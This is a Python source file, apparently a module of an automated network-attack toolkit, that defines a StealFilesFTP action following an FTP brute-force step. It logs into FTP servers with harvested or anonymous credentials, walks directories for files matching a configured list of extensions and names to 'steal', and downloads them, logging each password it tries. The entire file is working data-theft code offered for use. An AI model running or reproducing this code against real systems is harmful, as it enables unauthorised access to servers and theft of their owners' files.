"""
steal_files_ftp.py - This script connects to FTP servers using provided credentials or anonymous access, searches for specific files, and downloads them to a local directory.
"""

import os
import logging
from ftplib import FTP
from shared import SharedData
from logger import Logger
from actions.base_steal import BaseSteal

logger = Logger(name="steal_files_ftp.py", level=logging.DEBUG)

b_class = "StealFilesFTP"
b_module = "steal_files_ftp"
b_status = "steal_files_ftp"
b_parent = "FTPBruteforce"
b_port = 21


class StealFilesFTP(BaseSteal):
    protocol_name = "ftp"
    credential_file_attr = "ftpfile"

    def connect(self, ip, username, password):
        try:
            ftp = FTP()
            ftp.connect(ip, 21)
            ftp.login(user=username, passwd=password)
            self.connected = True
            logger.info(f"Connected to {ip} via FTP with username {username}")
            return ftp
        except Exception as e:
            logger.error(f"FTP connection error for {ip} with user '{username}' and password '{password}': {e}")
            return None

    def find_items(self, ftp, dir_path):
        files = []
        try:
            ftp.cwd(dir_path)
            items = ftp.nlst()
            for item in items:
                try:
                    ftp.cwd(item)
                    files.extend(self.find_items(ftp, os.path.join(dir_path, item)))
                    ftp.cwd('..')
                except Exception:
                    if any(item.endswith(ext) for ext in self.shared_data.steal_file_extensions) or \
                       any(file_name in item for file_name in self.shared_data.steal_file_names):
                        files.append(os.path.join(dir_path, item))
            logger.info(f"Found {len(files)} matching files in {dir_path} on FTP")
        except Exception as e:
            logger.error(f"Error accessing path {dir_path} on FTP: {e}")
        return files

    def steal_item(self, ftp, remote_file, local_dir):
        try:
            normalized = os.path.normpath(remote_file).replace('\\', '/')
            if normalized.startswith('..') or '/../' in normalized or normalized == '..':
                logger.error(f"Path traversal detected in remote file path: {remote_file}")
                return
            rel = normalized.lstrip('/')
            local_file_path = os.path.join(local_dir, rel)
            local_file_dir = os.path.dirname(local_file_path)
            os.makedirs(local_file_dir, exist_ok=True)
            with open(local_file_path, 'wb') as f:
                ftp.retrbinary(f'RETR {remote_file}', f.write)
            logger.success(f"Downloaded file from {remote_file} to {local_file_path}")
        except Exception as e:
            logger.error(f"Error downloading file {remote_file} from FTP: {e}")

    def disconnect(self, ftp):
        ftp.quit()

    def try_anonymous(self, ip):
        try:
            return self.connect(ip, 'anonymous', '')
        except Exception as e:
            logger.info(f"Anonymous access to {ip} failed: {e}")
            return None


if __name__ == "__main__":
    try:
        shared_data = SharedData()
        steal_files_ftp = StealFilesFTP(shared_data)
    except Exception as e:
        logger.error(f"Error in main execution: {e}")
